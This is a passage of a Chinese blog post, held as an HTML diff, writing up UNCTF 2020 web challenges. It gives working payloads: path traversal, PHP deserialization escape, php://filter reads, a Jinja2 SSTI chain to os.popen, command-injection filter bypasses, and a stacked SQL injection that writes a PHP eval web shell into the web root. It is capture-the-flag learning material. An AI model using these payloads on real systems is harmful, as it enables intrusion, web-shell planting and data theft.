@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="准备考试了没啥时间看，记录一下做的几道web还有复现一下没做出的题目。 easy_ssrf给了源码 123456789101112131415&amp;lt;?phpecho&amp;apos;&amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;welc0me to 2020UNCTF!!&amp;lt;&#x2F;strong&amp;gt;&amp;lt;&#x2F;center&amp;gt;&amp;apos;;highlight_file(__FILE__)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unctf_2020_web">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;11&#x2F;16&#x2F;unctf-2020-web&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="准备考试了没啥时间看，记录一下做的几道web还有复现一下没做出的题目。 easy_ssrf给了源码 123456789101112131415&amp;lt;?phpecho&amp;apos;&amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;welc0me to 2020UNCTF!!&amp;lt;&#x2F;strong&amp;gt;&amp;lt;&#x2F;center&amp;gt;&amp;apos;;highlight_file(__FILE__)">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;16&#x2F;XM8QP6C42yNRvW3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;18&#x2F;nshTjOxldBob3kY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;23&#x2F;ukKf9bTC5rXGBFn.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;23&#x2F;DiWl1yFEHLtanCm.png">
+<meta property="og:updated_time" content="2020-11-23T12:38:26.182Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;16&#x2F;XM8QP6C42yNRvW3.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/11/16/unctf-2020-web/"/>
+
+
+
+
+
+  <title>unctf_2020_web | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/16/unctf-2020-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">unctf_2020_web</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-16T09:53:39+08:00">
+                2020-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  16
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>准备考试了没啥时间看，记录一下做的几道web还有复现一下没做出的题目。</p>
+<h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><p>给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo&apos;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&apos;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">if(preg_match(&apos;/unctf\.com/&apos;,$url))&#123;</span><br><span class="line">    if(!preg_match(&apos;/php|file|zip|bzip|zlib|base|data/i&apos;,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        echo($url);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo(&apos;error!!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo(&quot;error&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>整个流程就是url参数里要有<code>unctf.com</code>进入分支，然后不能出现php之类的关键字。最后读取文件。</p>
+<p>这道题一开始看到ssrf思路错了。查到了file_get_contents可以从url读取文件之后直接<code>http://127.0.0.1</code>传进url参数。<br>导致了无限套娃。<br>后来又想着绕过preg_match的问题，传数组绕过也是行不通的。<br>后来发现是目录穿越来做题的。最终的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=unctf.com/../../../../flag</span><br></pre></td></tr></table></figure>
+<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p>同样给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">            if($this-&gt;password===&apos;easy&apos;)</span><br><span class="line">            &#123;</span><br><span class="line">                include(&apos;flag.php&apos;);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &apos;wrong password&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&apos;challenge&apos;,&apos;easychallenge&apos;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这道题之前碰到过类似的题目，主要是利用过滤函数来造成反序列化字符串的逃逸。<br>这里会把challenge替换成easychallenge。也就是说会多出四个字符。</p>
+<p>看一下源码梳理一下流程，<br>接收一个参数1，密码硬编码为1.<br>新建一个a的实例，用filter对实例序列化后的内容进行替换操作。<br>最后反序列化。</p>
+<p>wakeup这个魔术方法会在反序列化的时候被调用，其中如果密码为easy就拿到flag。<br>这里的思路就是利用filter对序列化内容的操作，构造一个特殊的字符串，由此达到改写password字段的目的。</p>
+<p>在本地测试一下。如果1传参数challenge会是怎么样的<br>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:9:&quot;easychallenge&quot;;s:8:&quot;password&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里明显是不能正确反序列化的。uname这里出错了，本该长度为9的，却变成了13。<br>也就是说一个challenge能让我们有4个长度的溢出。<br>想办法让经过filter序列化后的内容变为如下形式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:xxx:&quot;easychallengexxx&quot;;s:8:password;s:4:&quot;easy&quot;;&#125;s:8:&quot;password&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+<p>我们需要的插入的数据为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>长度是29<br>插入7个challenge的话是28个长度，不够。所以要插入8个challenge，但是这样一来长度又超过了<br>所以最后的payload要多增加几个字符，让长度填充得正好。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;abc</span><br></pre></td></tr></table></figure>
+<p>这个payload长度为104.正好是13*8.<br>序列化后的内容是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:104:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;abc&quot;;s:8:&quot;password&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是说，读取到我们设置的密码后，反序列化已经完成，后边的<code>abc&quot;;s:8:&quot;password&quot;;i:1;}</code>被丢弃。</p>
+<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // flag在flag.php</span><br><span class="line">    if(isset($_GET[&apos;a&apos;]))&#123;</span><br><span class="line">        if(preg_match(&apos;/\(.*\)/&apos;, $_GET[&apos;a&apos;]))</span><br><span class="line">            die(&apos;hacker!!!&apos;);</span><br><span class="line">        ob_start(function($data)&#123;</span><br><span class="line">                 if (strpos($data, &apos;flag&apos;) !== false)</span><br><span class="line">                 return &apos;ByeBye hacker&apos;;</span><br><span class="line">                 return false;</span><br><span class="line">                 &#125;);</span><br><span class="line">        eval($_GET[&apos;a&apos;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>正则匹配不允许成对括号。一开始想的是怎么绕过这个过滤引入括号执行命令。后来搞了半天没成功。<br>后来想着脑筋不用卡死在执行命令上，只需要读取flag.php的内容即可。这里除了不准用括号之外也没啥限制了。<br>想到源码里经常出现的文件包含是有不需要括号的形式的，直接尝试了一波require.但是这样其实会直接执行了，要获取内容需要利用一下伪协议<br>最后构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require%20&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br></pre></td></tr></table></figure>
+<p>===<br>复现部分</p>
+<h2 id="eaphp"><a href="#eaphp" class="headerlink" title="eaphp"></a>eaphp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;admin&quot;;</span><br><span class="line">$password  = &quot;password&quot;;</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$data = isset($_POST[&apos;data&apos;])? $_POST[&apos;data&apos;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line">if ($data_unserialize[&apos;username&apos;]==$username&amp;&amp;$data_unserialize[&apos;password&apos;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一眼看去好像就是一个数组的反序列化过程，简单！<br>本地一试打完之后发现行不通。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:8:&quot;password&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>注意到包含了flag.php这个文件。基本就是里面定义的变量覆盖了username和password,所以打不通。<br>这题我本来以为是反序列化有什么污染变量的法子。。看了题解发现是弱类型比较。<br>php里面不为空的字符串和true进行弱比较是为真的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(true == &quot;adsf&quot;); //true</span><br></pre></td></tr></table></figure>
+
+<p>所以构造的payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本地源码</span><br><span class="line">$a = array();</span><br><span class="line">$a[&apos;username&apos;] = true;</span><br><span class="line">$a[&apos;password&apos;] = true;</span><br><span class="line">echo serialize($a);</span><br><span class="line">最终payload</span><br><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
+<p>贴一个师傅关于php弱类型的总结<a href="https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/" target="_blank" rel="noopener">传送门</a></p>
+<h2 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h2><p>已经条件反射的看到flask就想到python的ssti注入。但是正式比赛的时候没看这题。参照这个wp复现<a href="https://www.cnblogs.com/NPFS/p/13974443.html" target="_blank" rel="noopener">传送门</a><br>进去提示要先以管理员登录，扫一下目录发现/login和/register两个端口<br>先注册为admin再登录，提示/secret_route_you_do_not_know 这个路由<br>访问，提示you should ‘guess’ the secret number。这里就有点脑洞。要给一个guess参数<br>fuzz发现”[]_都被过滤了。<br>参照师傅的题解，[]可以用getitem绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__mro__[2] == __mro__.getitem__(2)</span><br><span class="line"></span><br><span class="line">_和引号可以用|attr绕过</span><br><span class="line">例如&#123;&#123;()|attr(request.values.name1)&#125;&#125;&amp;name1=class</span><br></pre></td></tr></table></figure>
+<p>最终的payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(117)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&apos;cat ./flag.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+<p>关于这个payload的部分解释，在这篇文章里有<a href="https://xz.aliyun.com/t/6885" target="_blank" rel="noopener">传送门</a><br>其中说明了request.args.param是flask特有的，还有其他方式绕过引号的过滤。<br>这篇文章也有详细的解释<a href="https://zhuanlan.zhihu.com/p/93746437" target="_blank" rel="noopener">传送门</a><br><img src="https://i.loli.net/2020/11/16/XM8QP6C42yNRvW3.png" alt="1.png"><br>再配合request.args.param即可实现完美绕过</p>
+<h2 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h2><p>这题有个hint</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示1：if(!(is_file($name)===false))&#123;flag&#125;else&#123;no flag&#125;</span><br></pre></td></tr></table></figure>
+<p>直接传入数组。is_file(数组)返回null。和false全等结果为false，随后取反即为true。<br>做这种题还是多关注传数组的问题。。。</p>
+<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>看着像强网杯随便注，实际上也是改编的。<br>提示了shell不在数据库，load_file测试了下被禁用。<br>select也被禁用，handler等也不行。<br>这就是提示我们不要死磕数据库了，可以尝试写shell。<br>用prepare xx from sql表达式。execute xx;的方式执行sql语句写入shell。<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1%27;prepare%20irrik%20from%20char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,97,93,41,32,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,105,114,114,105,107,46,112,104,112,39);execute%20irrik;--+</span><br><span class="line"></span><br><span class="line">也就是</span><br><span class="line">prepare irrik from select &apos;&lt;?php eval($_POST[a]) ?&gt;&apos; into outfile &apos;/var/www/html/irrik.php&apos;; execute irrik;</span><br></pre></td></tr></table></figure>
+<p>这里mysql的char函数是可以接受多个参数的。<br>用char的目的是绕过关键字的过滤。</p>
+<h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><p>这题一看到url就知道命令执行了。题目应该想过滤反斜线但是正则没写好</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读源码</span><br><span class="line">?url=http%3A%2F%2F127.0.0.1|c\at&lt;index.php&amp;GO=GO</span><br><span class="line">就算禁用了反斜线还是有less等读取命令在，仍旧可用</span><br></pre></td></tr></table></figure>
+<p>源码如下<br><img src="https://i.loli.net/2020/11/18/nshTjOxldBob3kY.png" alt="1.png"><br>想执行命令需要空格<br>但是这里过滤了分号和dollar符号还有输出重定向。<br>考虑到php环境，可用<code>%09</code>代替空格。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找到flag在根目录下</span><br><span class="line">?url=http%3A%2F%2F127.0.0.1|ls%09/&amp;GO=GO</span><br></pre></td></tr></table></figure>
+<p>空格可用之后，发现也没有禁用反引号，使用base64编码配合反引号执行命令即可<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http%3A%2F%2F127.0.0.1|`echo%09Y2F0IC9mbGFn|base64%09-d`&amp;GO=GO</span><br></pre></td></tr></table></figure>
+<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>按提示输入?source看到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$adminPassword = &apos;d8b8caf4df69a81f2815pbcb74cd73ab&apos;;</span><br><span class="line">if (!function_exists(&apos;fuxkSQL&apos;)) &#123;</span><br><span class="line">    function fuxkSQL($iText)</span><br><span class="line">    &#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(&apos;\\\\&apos;, &apos;\\&apos;, $oText);</span><br><span class="line">        $oText = str_replace(&apos;\&quot;&apos;, &apos;&quot;&apos;, $oText);</span><br><span class="line">        $oText = str_replace(&quot;\&apos;&quot;, &quot;&apos;&quot;, $oText);</span><br><span class="line">        $oText = str_replace(&quot;&apos;&quot;, &quot;&apos;&apos;&quot;, $oText);</span><br><span class="line">        return $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!function_exists(&apos;getVars&apos;)) &#123;</span><br><span class="line">    function getVars()</span><br><span class="line">    &#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        if (count($_GET)) &#123;</span><br><span class="line">            foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">                global $&#123;$key&#125;;</span><br><span class="line">                if (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = array();</span><br><span class="line">                    foreach ($value as $key2 =&gt; $value2) &#123;</span><br><span class="line">                        if (function_exists(&apos;mysql_real_escape_string&apos;)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(&apos;&quot;&apos;, &apos;\&quot;&apos;, str_replace(&quot;&apos;&quot;, &quot;\&apos;&quot;, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (function_exists(&apos;mysql_real_escape_string&apos;)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(&apos;&quot;&apos;, &apos;\&quot;&apos;, str_replace(&quot;&apos;&quot;, &quot;\&apos;&quot;, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 